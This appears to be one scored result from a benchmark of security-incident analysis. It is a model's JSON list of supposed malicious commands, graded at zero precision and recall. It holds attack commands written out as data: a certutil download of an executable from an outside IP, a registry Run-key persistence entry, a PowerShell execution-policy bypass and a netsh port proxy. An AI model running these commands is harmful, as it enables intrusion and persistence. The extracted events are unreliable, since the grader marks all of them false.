@@ -1,0 +1,77 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a x.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -code a.txt b.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\TEST",
+        "sub-command": "value TEST /t REG_EXPAND_SZ /d 'C:\\Windows\\System32\\Notepad.exe'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell -ExecutionPolicy Bypass -File PSReadLineProfile.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "This incident shows a sophisticated attack involving multiple layers of intrusion techniques.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 165284,
+      "completion_tokens": 6607,
+      "total_tokens": 171891,
+      "wall_clock_s": 118.653,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.2857142857142857,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 165284,
+      "completion_tokens": 6607,
+      "total_tokens": 171891,
+      "wall_clock_s": 118.653,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
